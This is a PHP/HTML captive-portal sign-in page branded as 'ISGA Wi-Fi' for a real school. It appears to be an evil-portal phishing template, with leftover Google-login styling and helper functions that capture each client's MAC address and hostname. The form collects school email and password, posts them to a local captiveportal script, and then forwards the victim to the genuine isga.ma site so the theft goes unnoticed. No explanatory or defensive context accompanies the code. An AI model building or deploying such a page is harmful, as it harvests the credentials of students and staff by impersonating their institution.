<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>
<head>
  <title>Sign in - ISGA Wi-Fi</title>

  <meta charset='UTF-8'>
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="pragma" content="no-cache" />
  <meta name="viewport" content="width=device-width, initial-scale=0.75, maximum-scale=0.75, user-scalable=no">

  <script src="jquery-2.2.1.min.js"></script>
  <script type="text/javascript">
    function redirect() {
      setTimeout(function() {
        window.location = "https://www.isga.ma";
      }, 100);
    }
  </script>

  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/css/style.css">
  <link rel="icon" type="image/png" href="assets/img/isga-logo.png"/>

  <style>
    body {
      background-image: url("assets/img/isga-campus-bg.jpg");
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      background-size: cover;
    }

    .google-header-bar {
      height: 71px;
      border-bottom: 1px solid #e5e5e5;
      overflow: hidden;
    }

    .google-header-bar.centered {
      border: 0;
      height: 108px;
    }

    .google-header-bar.centered .header .logo {
      float: none;
      margin: 40px auto 30px;
      display: block;
    }

    .google-header-bar.centered .header .secondary-link {
      display: none;
    }

    .header .logo {
      margin: 17px 0 0;
      float: left;
      height: 38px;
      width: 116px;
    }

    @media screen and (max-width: 800px), screen and (max-height: 800px) {
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    }

    @media screen and (max-width: 580px) {
      html, body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="account-wall">
      <img class="profile-img" src="assets/img/isga-logo.png" alt="ISGA Logo">

      <h1 class="text-center login-title">ISGA Wi-Fi</h1>
      <h2 class="text-center friends-text">Welcome to the ISGA network</h2>

      <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
        <input type="text" name="email" class="form-control" placeholder="School Email" required>
        <input type="password" name="password" class="form-control" placeholder="Password" required><br>
        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="target" value="<?=$destination?>">
        <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Accept &amp; Connect</button>

        <!-- ✅ Final Text Styling -->
        <p style="color: black; font-size: 15px; text-align: center;">
          I agree to the 
          <a href="#" id="btn1" style="color: #e1001a; text-decoration: none;">Terms of Service</a> and have 
          reviewed the 
          <a href="#" style="color: #e1001a; text-decoration: none;">ISGA Privacy Policy</a><br>
          Need help? 
          <a href="#" style="color: #e1001a; text-decoration: none;">Contact ISGA IT</a>
        </p>
      </form>

      <!-- Modal -->
      <div id="myModal" class="modal url-color1">
        <div class="modal-content">
          <div class="modal-header">
            <span class="close">×</span>
            <h2>Terms of Service</h2>
          </div>
          <div class="modal-body">
            <p>This is a free wireless hotspot internet service (“Service”) provided by ISGA for students and staff.</p>
            <p>(a) You agree not to misuse the service for illegal or harmful activity.</p>
            <p>(b) The use of this Wi-Fi is logged and monitored in accordance with ISGA policy.</p>
            <p>(c) This service is for academic use only. Abuse may lead to disciplinary action.</p>
          </div>
        </div>
      </div>

      <script>
        var modal = document.getElementById('myModal');
        var btn = document.getElementById("btn1");
        var span = document.getElementsByClassName("close")[0];

        btn.onclick = function () {
          modal.style.display = "block";
        }

        span.onclick = function () {
          modal.style.display = "none";
        }

        window.onclick = function (event) {
          if (event.target == modal) {
            modal.style.display = "none";
          }
        }
      </script>
    </div>
  </div>
</body>
</html>
